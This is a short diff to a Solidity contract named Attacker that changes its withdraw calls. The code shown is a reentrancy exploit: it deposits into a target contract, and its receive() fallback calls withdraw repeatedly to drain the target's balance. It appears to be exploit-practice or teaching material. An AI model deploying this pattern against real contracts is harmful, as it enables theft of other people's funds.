@@ -26,7 +26,7 @@ contract Attacker {
 
     function exploit()external payable onlyOwner{
         toAttack.deposit{value:msg.value}();
-        toAttack.withdraw();
+        toAttack.withdraw(msg.value);
     }
 
 
@@ -39,7 +39,7 @@ contract Attacker {
 
     receive()external payable{
         if(address(toAttack).balance > 0){
-            toAttack.withdraw();
+            toAttack.withdraw(msg.value);
         }
     }
 
